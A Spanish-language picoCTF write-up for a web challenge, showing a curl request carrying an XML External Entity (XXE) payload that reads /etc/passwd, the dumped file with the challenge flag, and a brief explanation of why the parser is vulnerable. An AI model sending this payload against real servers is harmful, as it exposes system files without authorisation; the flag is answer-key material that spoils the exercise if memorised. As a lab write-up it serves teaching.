## Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:54753/)

**Solución 1 - terminal Linux
```
<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
  |
  |
  v
 usuarionazz890@DESKTOP-EHL2SJN:~$ curl -X POST "http://saturn.picoctf.net:54753/data" \-H "Content-Type: application/xml" \-d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4} 

```

#### NOTAS
- ### ¿Qué es el ataque XXE?

Este reto es un ejemplo perfecto de **Inyección de Entidades Externas XML (XXE)**.

Este ataque ocurre porque:

1. El servidor usa un **parser de XML** que tiene habilitadas las entidades externas por defecto.
2. Nosotros definimos una "entidad" (como una variable) llamada `&xxe;` que apunta a un archivo sensible del sistema (`/etc/passwd`).
3. Cuando el servidor procesa el XML y llega a `<ID>&xxe;</ID>`, reemplaza nuestra "variable" con el contenido real del archivo y nos lo muestra en la respuesta.